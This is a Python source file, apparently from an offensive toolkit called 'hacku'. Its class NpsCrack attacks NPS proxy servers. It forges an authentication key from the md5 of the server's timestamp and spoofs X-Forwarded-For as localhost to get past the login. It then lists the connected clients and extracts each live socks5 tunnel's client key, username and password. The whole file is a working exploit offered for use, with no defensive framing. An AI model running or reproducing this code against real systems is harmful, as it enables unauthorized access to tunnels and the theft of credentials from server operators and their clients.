# coding=utf-8

from hashlib import md5
from urllib.parse import urlparse

import requests
from loguru import logger

from hacku import UA


class NpsCrack:
    def __init__(self, target, proxy_url):
        self.params = None
        self.target = target
        self.headers = {
            "User-Agent": UA.get_random_user_agent(),
            "X-Forwarded-For": "127.0.0.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
        self.proxy = {
            "http": proxy_url,
            "https": proxy_url
        }
        self.calc_auth_key()

    def calc_auth_key(self):
        response = requests.post(f'{self.target}/auth/gettime', headers=self.headers, proxies=self.proxy, verify=False)
        rjson = response.json()
        t = rjson['time'] + 15
        key = md5(str(t).encode()).hexdigest()
        self.params = {'auth_key': key, 'timestamp': t}

    def get_nps_info(self):
        data = {"search": "", "order": "asc", "offset": "0", "limit": "10"}
        try:
            resp = requests.post(f'{self.target}/client/list', data=data, params=self.params, headers=self.headers, proxies=self.proxy, verify=False)
            rjson = resp.json()
            if "ip" in rjson:
                server_ip = rjson["ip"]
                server_bridge_port = rjson["bridgePort"]
                server_bridge_type = rjson["bridgeType"]
                logger.warning(
                    "NPS server IP:{IP} bridgeport:{BRIDGEPORT} bridgetype:{BRIDGETYPE}.".format(
                        IP=server_ip,
                        BRIDGEPORT=server_bridge_port,
                        BRIDGETYPE=server_bridge_type,
                    )
                )
                write_data = "ServerIP : " + server_ip + "\n"
                write_data += "ServerBridgePort : " + str(server_bridge_port) + "\n"
                write_data += "ServerBridgeType : " + server_bridge_type + "\n"
                logger.info(write_data)
            else:
                logger.info(rjson["rows"])
        except Exception as e:
            logger.error(f"Clients connect failed. {e}")

    def get_tunnel_info(self, tunnel_type="socks5"):
        data = {"offset": "0", "limit": "100", "type": tunnel_type, "search": "", "client_id": ""}
        res = list()
        try:
            resp = requests.post(f'{self.target}/index/gettunnel', data=data, params=self.params, headers=self.headers, proxies=self.proxy, verify=False)
            rjson = resp.json()
            for r in rjson["rows"]:
                if r['Status'] and r['RunStatus'] and r['Client']['Status'] and r['Client']['IsConnect']:
                    res.append({
                        "client_ip": r['Client']['Addr'],
                        "client_key": r['Client']['VerifyKey'],
                        "server_ip": r['ServerIp'] if r['ServerIp'] else urlparse(self.target).netloc.split(':')[0],
                        "server_port": r['Port'],
                        "username": r['Client']['Cnf']['U'],
                        "password": r['Client']['Cnf']['P']
                    })
        except Exception as e:
            logger.error(e)
        return res
